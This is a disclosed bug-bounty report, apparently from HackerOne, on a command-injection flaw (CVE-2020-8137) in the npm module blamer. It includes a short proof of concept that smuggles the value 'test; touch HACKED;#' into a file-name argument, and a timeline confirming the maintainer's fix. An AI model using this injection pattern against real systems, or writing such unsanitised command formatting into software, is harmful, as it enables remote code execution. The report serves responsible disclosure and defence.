---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/code-injection
  - env/web
  - stack/node
  - impact/rce
substate: "resolved"
weakness: "Code Injection"
enriched: true
body: true
date: 2020-03-10
submitted: 2020-01-11T22:55:05.419Z
bounty_usd: null
votes: 7
cve: "CVE-2020-8137"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "mik317"
source: "https://hackerone.com/reports/772448"
title: "[blamer] RCE via insecure command formatting"
---
# [blamer] RCE via insecure command formatting

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 7 | **Program:** Node.js third-party modules | **Disclosed:** 2020-03-10

- Report: [https://hackerone.com/reports/772448](https://hackerone.com/reports/772448)
- CWE: Code Injection | CVE: CVE-2020-8137
- Submitted: 2020-01-11T22:55:05.419Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report a `RCE` issue in the `blamer` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `blamer`
**version:** `0.1.13`
**npm page:** `https://www.npmjs.com/package/blamer`

## Module Description
> Blamer is a tool for get information about author of code from version control system. Supports git and subversion.

## Module Stats
[~1800] downloads in the last day
[12,910] downloads in the last week
[~52k] downloads in the last month

## Vulnerability Description
The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check. The issue arises here: https://github.com/kucherenko/blamer/blob/master/src/vcs/git.js#L24

## Steps To Reproduce:
1. Create the following PoC file:

```js
// poc.js
var Blamer = require('blamer');
var blamer = new Blamer('git');
blamer.blameByFile('poc.js', 'test; touch HACKED;#');

```
1. Check there aren't files called `HACKED` 
1. Execute the following commands in another terminal:

```bash
npm i blamer # Install affected module
node poc.js #  Run the PoC
```
1. Recheck the files: now `HACKED` has been created :) {F681902}

## Patch
> Don't format `commands` using insecure `user's inputs` :)

## Supporting Material/References:
- [OPERATING SYSTEM VERSION]: Kali Linux
- [NODEJS VERSION]: 10.16.3
- [NPM VERSION]: 6.0.9

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

`RCE` via command formatting on `blamer`

## Timeline

- **Report Filed**
- **2020-01-12** @nochnoidozor: Hi @mik317,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@nochnoidozor
- **Report Triaged**
- **2020-03-09** @marcinhoppe: @mik317 `blamer` version 1.0.1 with the fix has been released. Can you confirm it addresses the issue?
- **2020-03-09** @mik317: I ran the following code:

```js
// poc.js
var Blamer = require('blamer');
var blamer = new Blamer.default('git');
blamer.blameByFile('poc.js', 'test; touch HACKED;#');

```
and the issue seems *fixed* as well :)

Thanks again,
Mik
- **2020-03-10** @marcinhoppe: Great, I will disclose it and request a CVE.
- **Report Resolved**
- **Agreed On Going Public**
- **Report Severity Updated**
- **2020-03-10** @marcinhoppe: @mik317 I made an attempt to come up with a CVSS score for this finding. Can you check and see if it looks reasonable to you?
- **2020-03-10** @mik317: Hi @marcinhoppe :),
first of all thank you for your quick response :).
I confirm it can be a good CVSS score, I set `critical` to be sure the issue would have been addressed ASAP :).
Let me know, if possible, when the CVE will be assigned :)

Best, Mik
- **2020-03-10** @marcinhoppe: I will request a CVE after this report has been disclosed.
- **Agreed On Going Public**
- **Report Became Public**
